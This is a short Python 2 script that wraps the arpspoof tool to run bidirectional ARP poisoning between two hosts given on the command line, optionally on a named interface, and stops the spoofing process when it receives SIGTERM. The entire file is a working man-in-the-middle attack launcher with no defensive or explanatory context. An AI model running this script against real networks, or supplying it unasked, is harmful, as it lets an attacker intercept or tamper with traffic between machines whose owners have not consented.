#!/usr/bin/env python
import os
import sys
import subprocess
import signal

interface = sys.argv[1]
host1 = sys.argv[2]
host2 = sys.argv[3]

if interface.strip() == "":
    c1 = "arpspoof -t %s -r %s" % (host1, host2)
else:
    c1 = "arpspoof -i %s -t %s -r %s" % (interface, host1, host2)

p1 = subprocess.Popen(c1.split(), shell=False, preexec_fn=os.setsid)
print c1

print "Arp poisoning running for hosts: %s, %s" % (host1, host2)

sys.stdout.flush()

def signal_handler(signal, frame):
    print 'Killing pid %d' % p1.pid
    #os.kill(p1.pid, 9)
    p1.terminate()
    print 'Exiting now!'
    sys.stdout.flush()
    sys.exit(0)


signal.signal(signal.SIGTERM, signal_handler)

while(1):
    pass

